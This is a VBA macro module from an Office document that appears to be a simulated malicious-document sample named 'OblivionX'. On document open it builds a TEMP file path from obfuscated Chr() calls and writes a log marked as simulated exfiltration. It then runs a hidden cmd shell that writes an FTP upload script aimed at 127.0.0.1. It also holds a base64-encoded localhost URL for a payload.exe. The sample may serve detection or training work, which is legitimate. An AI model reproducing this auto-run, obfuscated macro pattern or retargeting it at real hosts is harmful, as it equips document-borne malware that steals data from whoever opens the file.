Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim f As Integer, logPath As String
    logPath = Environ("TEMP") & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(108) & Chr(111) & Chr(103) & Chr(46) & Chr(116) & Chr(120) & Chr(116)
    f = FreeFile
    Open logPath For Output As #f
    Print #f, "marker-ftp-log: simulated exfiltration data"
    Close #f
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\oblivionx_ftp.txt", 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
